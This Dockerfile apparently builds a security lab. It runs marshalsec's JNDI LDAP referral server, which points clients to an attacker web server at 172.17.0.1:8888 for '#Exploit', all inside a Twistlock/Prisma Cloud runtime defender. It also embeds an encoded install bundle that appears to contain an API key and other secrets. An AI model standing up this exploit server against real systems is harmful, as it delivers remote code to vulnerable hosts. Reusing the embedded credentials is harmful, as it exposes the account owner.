FROM maven:3.8-jdk-11
EXPOSE 1389
RUN mkdir /ldap
COPY . /ldap
WORKDIR /ldap
RUN mvn package -DskipTests

# sleep 5 for race condition
RUN sleep 5

# Make marshalsec's LDAP server to redirect the client to host (172.17.0.1)'s attacker web server
# CHANGEME to change attacker web server's 8888 port. 
ADD ./twistlock_defender_app_embedded.tar.gz /
ENV DEFENDER_TYPE="appEmbedded"
ENV DEFENDER_APP_ID="cloudrun-vuln-ldap"
ENV FILESYSTEM_MONITORING="true"
ENV WS_ADDRESS="wss://us-east1.cloud.twistlock.com:443"
ENV DATA_FOLDER="/ldap"
ENV INSTALL_BUNDLE="eyJzZWNyZXRzIjp7InNlcnZpY2UtcGFyYW1ldGVyIjoiYjFVd2RpeUJKeUhqaGdiQjNrNGMvRTF4ejhIR3VMcExnNG9WTTNSc3pKcldMYzVMM1pTb0FlN2N0bEJjeEQzL2RhclJaclFjOHQ0Mlh5SkQ1WlVrS1E9PSJ9LCJnbG9iYWxQcm94eU9wdCI6eyJodHRwUHJveHkiOiIiLCJub1Byb3h5IjoiIiwiY2EiOiIiLCJ1c2VyIjoiIiwicGFzc3dvcmQiOnsiZW5jcnlwdGVkIjoiIn19LCJjdXN0b21lcklEIjoidXMtMi0xNTgyNTY4ODUiLCJhcGlLZXkiOiI5YlloWFMvTzIyKzhqNDQxTHFHcENCR1dvRlVtK3dzdHlZWjFvNnpEV29kV2dYa01JQXRiUUV3eDl6TmZYWEJNb1pRd1htYWszNXpyY1hCWkdMQ290dz09IiwibWljcm9zZWdDb21wYXRpYmxlIjpmYWxzZSwiaW1hZ2VTY2FuSUQiOiJhNDcwODhmYS02Y2EwLTJjMmMtOWM3NC0xYjViZWMzYzczOTUifQ=="
CMD [ "/defender", "app-embedded", "java", "-cp", "/ldap/target/marshalsec-0.0.3-SNAPSHOT-all.jar", "marshalsec.jndi.LDAPRefServer" ,"http://172.17.0.1:8888/#Exploit"]
